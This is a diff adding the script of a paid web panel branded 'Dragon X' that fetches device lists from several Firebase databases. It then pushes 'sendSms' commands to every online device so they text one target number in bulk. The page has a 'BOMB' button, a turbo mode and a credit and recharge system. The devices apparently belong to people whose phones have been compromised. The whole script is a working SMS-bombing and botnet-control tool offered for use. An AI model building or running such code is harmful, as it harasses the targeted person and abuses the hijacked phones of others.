+            const timeout = setTimeout(() => controller.abort(), timeoutMs);
+            return fetch(url, { ...options, signal: controller.signal })
+                .then(r => { clearTimeout(timeout); return r; })
+                .catch(e => { clearTimeout(timeout); throw e; });
+        }
+
+        async function fbFetch(url, path, userKey) {
+            let full = url.replace(/\/$/, '') + '/' + path + '.json';
+            const key = userKey && userKey.trim() ? userKey.trim() : genRandomKey();
+            const params = new URLSearchParams();
+            params.set('auth', key);
+            params.set('orderBy', '"$key"');
+            params.set('limitToLast', String(MESSAGE_LIMIT));
+            full += '?' + params.toString();
+            const res = await fetchWithTimeout(full, { method: 'GET' });
+            if (!res.ok) {
+                if (res.status === 401 || res.status === 403) throw new Error('DENIED');
+                if (res.status === 404) return null;
+                throw new Error('HTTP ' + res.status);
+            }
+            return res.json();
+        }
+
+        async function fbPut(url, path, userKey, data) {
+            let full = url.replace(/\/$/, '') + '/' + path + '.json';
+            const key = userKey && userKey.trim() ? userKey.trim() : genRandomKey();
+            full += '?' + new URLSearchParams({ auth: key }).toString();
+            const res = await fetchWithTimeout(full, {
+                method: 'PUT', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            if (!res.ok) throw new Error('HTTP ' + res.status);
+            return res.json();
+        }
+
+        function parseClients(data) {
+            const out = [];
+            if (!data || typeof data !== 'object') return out;
+            for (const [id, val] of Object.entries(data)) {
+                if (!val || typeof val !== 'object') continue;
+                out.push({ id: id, status: !!val.status });
+            }
+            return out;
+        }
+
+        function shuffleArray(arr) {
+            for (let i = arr.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [arr[i], arr[j]] = [arr[j], arr[i]];
+            }
+            return arr;
+        }
+
+        let isSending = false;
+
+        async function sendBulkSms() {
+            if (isSending) return;
+            if (!isVerified) { log('⚠️ Join channel first', 'err'); return; }
+            if (!isSystemOn && !isAdmin) { log('⛔ System offline', 'err'); return; }
+
+            const target = targetInput.value.trim();
+            const message = messageInput.value.trim();
+            const secret = secretInput.value.trim();
+            const quantity = parseInt(quantitySelect.value);
+            const mode = speedSelect.value;
+
+            if (!target || !message || !secret) { log('⚠️ Fill all fields', 'err'); return; }
+            if (target.replace(/[^0-9]/g, '').length < 10) { log('⚠️ Invalid number', 'err'); return; }
+
+            if (!isAdmin) {
+                const today = new Date().toISOString().slice(0, 10);
+                const dailyLimit = getDailyLimit();
+                if (dailyLimit.date !== today) {
+                    dailyLimit.date = today;
+                    dailyLimit.used = 0;
+                    saveDailyLimit(dailyLimit);
+                }
+
+                if (userCredits < 1) {
+                    log(`❌ Babu, credits khatam! Recharge kro ya 🎟️ Redeem code use kro.`, 'err');
+                    alert(`❌ Babu, credits khatam ho gaye!\n\n💳 Recharge kro ya 🎟️ Redeem code use kro`);
+                    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                    document.querySelector('.tab[data-panel="recharge"]').classList.add('active');
+                    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+                    document.getElementById('panel-recharge').classList.add('active');
+                    return;
+                }
+
+                userCredits -= 1;
+                dailyLimit.used += 1;
+                saveDailyLimit(dailyLimit);
+                saveCredits();
+                updateCreditDisplay();
+                log(`💎 1 Credit used. (${userCredits} total left)`, 'info');
+                if (userCredits === 0) {
+                    log(`⚠️ Babu, credits khatam! Recharge kro ya 🎟️ Redeem code use kro.`, 'warn');
+                }
+            } else { log(`👑 Admin unlimited fire`, 'ok'); }
+
+            isSending = true;
+            sendBtn.disabled = true;
+            sendBtn.innerHTML = '<span class="spinner"></span>';
+            logEl.innerHTML = '';
+            statusBar.style.display = 'flex';
+
+            let totalSent = 0, totalFailed = 0, round = 0;
+            const startTime = Date.now();
+            const totalToSend = Math.min(quantity, MAX_SMS_PER_USE);
+
+            const fetchPromises = DATABASE_URLS.map(async (dbUrl) => {
+                try {
+                    const data = await fbFetch(dbUrl, 'clients', secret);
+                    if (!data) return { dbUrl, clients: [] };
+                    return { dbUrl, clients: parseClients(data).filter(c => c.status) };
+                } catch (e) { return { dbUrl, clients: [] }; }
+            });
+            const results = await Promise.allSettled(fetchPromises);
+            let allDevices = [];
+            for (const r of results) {
+                if (r.status === 'fulfilled') {
+                    allDevices = allDevices.concat(r.value.clients.map(c => ({ ...c, dbUrl: r.value.dbUrl })));
+                }
+            }
+            shuffleArray(allDevices);
+            const totalDevices = allDevices.length;
+            onlineCount.textContent = totalDevices;
+
+            if (totalDevices === 0) {
+                log(`❌ No devices found`, 'err');
+                if (!isAdmin) { userCredits += 1; saveCredits(); updateCreditDisplay(); }
+                sendBtn.disabled = false;
+                sendBtn.innerHTML = '<span>🚀</span> BOMB';
+                isSending = false;
+                return;
+            }
+            log(`✅ ${totalDevices} devices online`, 'ok');
+
+            while (totalSent < totalToSend) {
+                round++;
+                roundCount.textContent = round;
+                const batch = allDevices.slice(0, Math.min(totalDevices, totalToSend - totalSent));
+                const tasks = batch.map((device) => {
+                    const path = `clients/${device.id}/webhookEvent/sendSms`;
+                    return fbPut(device.dbUrl, path, secret, { from: 1, to: target, message: message, isSended: false })
+                        .then(() => { totalSent++; sentCount.textContent = totalSent; progressText.textContent = `🔥 ${totalSent}/${totalToSend}`; })
+                        .catch(() => { totalFailed++; failCount.textContent = totalFailed; });
+                });
+                if (mode === 'turbo') await Promise.all(tasks);
+                else for (const t of tasks) { await t; await new Promise(r => setTimeout(r, 300)); }
+            }
+            const elapsed = ((Date.now() - startTime)/1000).toFixed(1);
+            log(`✅ ${totalSent} sent · ${totalFailed} failed · ${elapsed}s`, 'ok');
+            sendBtn.disabled = false;
+            sendBtn.innerHTML = '<span>🚀</span> BOMB';
+            isSending = false;
+        }
+
+        sendBtn.addEventListener('click', sendBulkSms);
+
+        loadCreditData();
+        if (isAdminUnlocked()) {
+            isAdmin = true;
+            document.getElementById('adminPanel').classList.add('visible');
+            const btn = document.getElementById('adminHeaderBtn');
+            btn.classList.add('unlocked');
+            btn.textContent = '👑 ON';
+            loadPendingPayments();
+            renderGeneratedCodes();
+        }
+        if (localStorage.getItem(VERIFIED_KEY + '_' + getUserId()) === 'true') {
+            isVerified = true;
+            document.getElementById('forceJoinOverlay').classList.add('hidden');
+        }
+        updateCreditDisplay();
+        renderQr(10);
+
+        log(`🐉 Dragon X · ${DATABASE_URLS.length} DBs · 1 Credit = ${SMS_PER_CREDIT} SMS`, '');
+        log(`🎁 2 free credits on join · Recharge or Redeem for more`, 'info');
+        log(`📌 Owner: @Dragon_X_1`, 'info');
+    </script>
+</body>
+</html>
